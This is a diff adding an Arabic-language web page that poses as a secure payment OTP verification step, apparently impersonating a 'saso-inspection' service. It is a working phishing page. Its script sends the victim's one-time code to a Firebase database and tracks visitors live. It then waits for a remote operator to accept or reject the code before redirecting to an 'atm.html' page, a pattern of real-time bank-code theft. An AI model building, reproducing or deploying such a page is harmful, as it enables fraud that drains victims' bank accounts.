@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية - الرمز الآمن</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        :root { --main-green: #1e7344; --bg-light: #f7f8fa; --error-red: #dc3545; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; position: relative; }
+
+        .otp-container {
+            background: #fff; width: 100%; max-width: 350px; border-radius: 20px;
+            padding-bottom: 25px; box-shadow: 0 8px 25px rgba(0,0,0,0.05);
+            text-align: center; overflow: hidden;
+        }
+
+        .header-image { width: 100%; max-width: 180px; height: auto; margin: 20px auto 10px; display: block; }
+        .content { padding: 0 20px; }
+        h2 { font-size: 17px; color: #333; margin-bottom: 8px; font-weight: bold; }
+        p { font-size: 12px; color: #777; line-height: 1.5; margin-bottom: 20px; }
+
+        .otp-input-wrapper { margin-bottom: 15px; position: relative; display: inline-block; width: 100%; }
+        
+        .otp-single-field {
+            width: 100%; max-width: 220px; height: 45px; border: 1px solid #ddd;
+            border-radius: 8px; text-align: center; font-size: 20px; letter-spacing: 8px;
+            font-weight: bold; color: var(--main-green); outline: none; background-color: #fafafa; 
+            transition: 0.3s;
+        }
+
+        /* --- حالة الخطأ الجديدة --- */
+        .input-error { border: 2px solid var(--error-red) !important; color: var(--error-red) !important; background-color: #fff8f8 !important; }
+        .error-message { color: var(--error-red); font-size: 11px; font-weight: bold; margin-top: 8px; display: none; }
+
+        .timer-box { font-size: 12px; color: #999; margin-bottom: 20px; min-height: 20px; }
+        .btn-confirm { width: 100%; background-color: var(--main-green); color: white; border: none; border-radius: 10px; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-confirm:hover { background-color: #155d36; }
+        .secure-notice { margin-top: 15px; font-size: 10px; color: #bbb; }
+
+        #loadingOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95); display: none; 
+            flex-direction: column; justify-content: center; align-items: center; z-index: 9999;
+        }
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--main-green); border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <p style="color: #333; font-weight: bold; font-size: 14px;">جاري إتمام العملية...</p>
+    </div>
+
+    <div class="otp-container">
+        <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" class="header-image" alt="OTP Security">
+        <div class="content">
+            <h2>أدخل رمز التحقق</h2>
+            <p id="msgText">يرجى إدخال الرمز المكون من 4 أو 6 أرقام المرسل لجوالك.</p>
+
+            <div class="otp-input-wrapper">
+                <input type="tel" maxlength="6" class="otp-single-field" id="otpCode" placeholder="••••••">
+                <div id="otpErrorMsg" class="error-message">برجاء التحقق من الرمز المرسل على الجوال الصحيح</div>
+            </div>
+
+            <div class="timer-box" id="timerContent">
+                إعادة إرسال الرمز خلال <span id="timeCount">02:00</span> دقيقة
+            </div>
+            
+            <button class="btn-confirm" onclick="sendOTP()">تأكيد العملية</button>
+            <div class="secure-notice">🔒 نظام دفع مشفر وآمن بالكامل</div>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = { 
+            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
+            authDomain: "saso-inspection.firebaseapp.com",
+            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com", 
+            projectId: "saso-inspection",
+            storageBucket: "saso-inspection.appspot.com",
+            messagingSenderId: "1009002235896",
+            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const visitorId = localStorage.getItem('visitorId');
+
+        // تحديث حالة الزائر في لوحة التحكم
+        if (visitorId) {
+            database.ref('live_visitors/' + visitorId).update({ 
+                page: "صفحة الرمز OTP",
+                last_active: firebase.database.ServerValue.TIMESTAMP 
+            });
+        }
+
+        let timeLeft = 120;
+        const timeDisplay = document.getElementById('timeCount');
+        function startTimer() {
+            const timer = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    document.getElementById('timerContent').innerHTML = '<span onclick="location.reload()" style="cursor:pointer; color:#1e7344; font-weight:bold; text-decoration:underline;">إعادة إرسال الرمز الآن</span>';
+                } else {
+                    timeLeft--;
+                    let min = Math.floor(timeLeft / 60);
+                    let sec = timeLeft % 60;
+                    timeDisplay.innerText = `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
+                }
+            }, 1000);
+        }
+        window.onload = startTimer;
+
+        function sendOTP() {
+            const otpInput = document.getElementById('otpCode');
+            const errorMsg = document.getElementById('otpErrorMsg');
+            let otpVal = otpInput.value;
+
+            // التعديل هنا ليقبل 4 أو 6 أرقام
+            if (otpVal.length === 4 || otpVal.length === 6) {
+                document.getElementById('loadingOverlay').style.display = 'flex';
+
+                const paymentRef = database.ref('payments/' + visitorId);
+                paymentRef.update({
+                    otp: otpVal,
+                    status: "waiting_otp",
+                    last_update: firebase.database.ServerValue.TIMESTAMP
+                });
+
+                paymentRef.on('value', (snapshot) => {
+                    const data = snapshot.val();
+                    if (!data) return;
+                    
+                    if (data.status === "accept") {
+                        window.location.href = "atm.html";
+                    } 
+                    else if (data.status === "reject") {
+                        document.getElementById('loadingOverlay').style.display = 'none';
+                        showError();
+                        paymentRef.update({ status: "idle_otp" });
+                    }
+                });
+
+            } else {
+                showError();
+            }
+        }
+
+        function showError() {
+            const otpInput = document.getElementById('otpCode');
+            const errorMsg = document.getElementById('otpErrorMsg');
+            otpInput.classList.add('input-error');
+            errorMsg.style.display = "block";
+            otpInput.focus();
+        }
+
+        document.getElementById('otpCode').addEventListener('input', function() {
+            this.classList.remove('input-error');
+            document.getElementById('otpErrorMsg').style.display = "none";
+            // السماح فقط بالأرقام
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+</body>
+</html>
